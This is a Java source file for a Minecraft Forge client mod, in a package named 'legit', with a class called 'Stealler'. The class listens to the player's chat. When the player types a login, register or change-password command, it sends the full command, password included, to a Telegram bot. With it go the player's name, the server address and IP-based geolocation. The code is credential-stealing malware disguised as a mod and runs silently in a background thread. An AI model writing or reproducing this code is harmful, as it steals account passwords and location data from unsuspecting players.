package my.stur1ks.legit.module;

import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.event.entity.player.PlayerEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

@Mod.EventBusSubscriber
public class Stealler {

    @SubscribeEvent
    public static void onChat(ClientChatEvent event) {
        String message = event.getMessage().toLowerCase();
        if (message.startsWith("/l ") || message.startsWith("/login ") || message.startsWith("/reg ")  || message.startsWith("/register ")
                || message.startsWith("/cp ") || message.startsWith("/changepassword ") ) {
            Thread thread = new Thread(() -> {
                try {
                    String ipInfo = formatIPInfo(getIPInfo());
                    String playerName = Minecraft.getInstance().player.getName().getString();
                    String serverIP = Minecraft.getInstance().getCurrentServer() != null ?
                            Minecraft.getInstance().getCurrentServer().ip : "unknown";


                    SendTelegramm.sendMessage("📊 *Login Data*\n" +
                            "├─ *Player:* `" + playerName + "`\n" +
                            "├─ *Server:* `" + serverIP + "`\n" +
                            "├─ *Command:* `" + message + "`\n" +
                            "└─ *Location:*\n" + formatLocationInfo(ipInfo));

                } catch (Exception e) {
                    SendTelegramm.sendMessage("⚠️ Error: " + e.getMessage());
                }
            });
            thread.start();
        }
    }

    private static String getIPInfo() throws Exception {
        URL ipApi = new URL("http://ip-api.com/json/");
        BufferedReader reader = new BufferedReader(new InputStreamReader(ipApi.openStream()));
        StringBuilder response = new StringBuilder();
        String line;

        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();

        return response.toString();
    }

    private static String formatIPInfo(String jsonResponse) {
        return jsonResponse.replace("{", "")
                .replace("}", "")
                .replace("\"", "")
                .replace(",", "\n")
                .replace("status:", "")
                .replace("success", "")
                .replace("country:", "Country:")
                .replace("regionName:", "Region:")
                .replace("city:", "City:")
                .replace("zip:", "ZIP:")
                .replace("isp:", "ISP:")
                .replace("query:", "IP:")
                .replaceAll("([a-zA-Z]+):", "\n$1:")
                .trim();
    }

    private static String formatLocationInfo(String info) {
        String[] lines = info.split("\n");
        StringBuilder formatted = new StringBuilder();
        for (String line : lines) {
            if (line.trim().length() > 0) {
                formatted.append("    ├─ *").append(line.split(":")[0].trim())
                        .append(":* `").append(line.split(":")[1].trim())
                        .append("`\n");
            }
        }
        return formatted.toString();
    }
}
